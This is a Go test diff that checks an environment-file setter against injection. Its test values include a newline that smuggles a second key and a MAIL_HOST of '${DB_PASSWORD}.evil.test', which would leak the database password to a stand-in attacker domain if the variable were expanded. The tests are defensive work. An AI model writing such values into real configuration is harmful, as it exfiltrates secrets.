@@ -320,6 +320,7 @@ func TestEnvKeys(t *testing.T) {
 		"an unlisted key": {"APP_KEY": "x"},
 		"a second line":   {"MAIL_MAILER": "smtp\nAPP_KEY=x"},
 		"an object value": {"MAIL_MAILER": map[string]any{}},
+		"$ with a quote":  {"MAIL_MAILER": "${DB_PASSWORD}'"},
 	} {
 		if _, err := s.Call("acme.horizon", proj.ID, "project.env.set", map[string]any{"values": values}); err == nil {
 			t.Errorf("%s must be refused", name)
@@ -327,5 +328,26 @@ func TestEnvKeys(t *testing.T) {
 	}
 	if env2, _ := os.ReadFile(filepath.Join(proj.Path, ".env")); string(env2) != string(env) {
 		t.Errorf("a refused set changed .env:\n%s", env2)
+	}
+}
+
+// A value that references another key is written so the app's dotenv loader
+// keeps it literal, and errors never carry the project's path.
+func TestEnvSetNoExpansionNoPaths(t *testing.T) {
+	s, proj := installView(t, edit(t, func(m map[string]any) {
+		m["permissions"] = []string{"terminal.run", "project.env.keys"}
+		m["env"] = []string{"MAIL_HOST"}
+	}))
+	defer os.RemoveAll(filepath.Join(store.HomeDir(), "backups"))
+	if _, err := s.Call("acme.horizon", proj.ID, "project.env.set", map[string]any{"values": map[string]any{"MAIL_HOST": "${DB_PASSWORD}.evil.test"}}); err != nil {
+		t.Fatal(err)
+	}
+	if env, _ := os.ReadFile(filepath.Join(proj.Path, ".env")); !strings.Contains(string(env), "MAIL_HOST='${DB_PASSWORD}.evil.test'") {
+		t.Errorf("must be single-quoted:\n%s", env)
+	}
+	os.Remove(filepath.Join(proj.Path, ".env"))
+	_, err := s.Call("acme.horizon", proj.ID, "project.env.set", map[string]any{"values": map[string]any{"MAIL_HOST": "x"}})
+	if err == nil || strings.Contains(err.Error(), proj.Path) {
+		t.Errorf("error must not reveal the project path: %v", err)
 	}
 }
